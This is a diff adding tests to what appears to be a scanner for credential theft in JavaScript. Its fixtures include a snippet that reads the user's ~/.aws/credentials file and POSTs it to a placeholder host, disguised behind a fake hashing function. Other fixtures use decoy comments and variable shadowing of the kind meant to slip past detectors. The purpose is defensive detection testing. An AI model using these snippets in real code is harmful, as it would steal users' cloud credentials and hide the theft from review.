@@ -706,6 +706,33 @@ def test_a_real_crypto_binding_or_untouched_global_is_a_reducer():
     aliased = _FS + "const os = require('os');\nconst c = require('node:crypto');\n" + (
         _SIGV4_BODY.replace("crypto.createHmac", "c.createHmac")
     )
-    untouched_global = _FS + "const os = require('os');\n" + _SIGV4_BODY
-    for src in (required, imported, aliased, untouched_global):
+    two_binds = _FS + "const os = require('os');\n" + (
+        "var crypto = require('crypto');\nvar crypto = require('node:crypto');\n"
+    ) + _SIGV4_BODY
+    for src in (required, imported, aliased, two_binds):
         assert _flow_rules(src) == {"JS_SECRET_FILE_FLOW": "warn"}, src
+
+
+def test_addendum5_no_credit_for_a_global_or_decoy_crypto():
+    untouched_global = _FS + "const os = require('os');\n" + _SIGV4_BODY
+    decoy_string = _FS + "const os = require('os');\n" + (
+        "const doc = \"const crypto = require('crypto')\";\n"
+        "const crypto = { createHmac: (a, k) => ({ update: () => ({ digest: () => k }) }) };\n"
+    ) + _SIGV4_BODY
+    decoy_comment = _FS + "const os = require('os');\n" + (
+        "// const crypto = require('crypto');\n"
+        "const crypto = { createHmac: (a, k) => ({ update: () => ({ digest: () => k }) }) };\n"
+    ) + _SIGV4_BODY
+    bound_then_shadowed = _FS + "const os = require('os');\nconst crypto = require('crypto');\n" + (
+        "function go(crypto) {\n"
+    ) + _SIGV4_BODY + "}\n"
+    destructured_then_reassigned = _FS + "const os = require('os');\n" + (
+        "let { createHmac } = require('crypto');\n"
+        "createHmac = (a, k) => ({ update: () => ({ digest: () => k }) });\n"
+        "const data = fs.readFileSync(os.homedir() + '/.aws/credentials', 'utf8');\n"
+        f"fetch('https://{_HOST}/', {{method: 'POST', body: createHmac('sha256', data)"
+        ".update('m').digest('hex')}});\n"
+    )
+    for src in (untouched_global, decoy_string, decoy_comment, bound_then_shadowed,
+                destructured_then_reassigned):
+        assert _flow_rules(src) == {"JS_CRED_EXFIL_FLOW": "crit"}, src
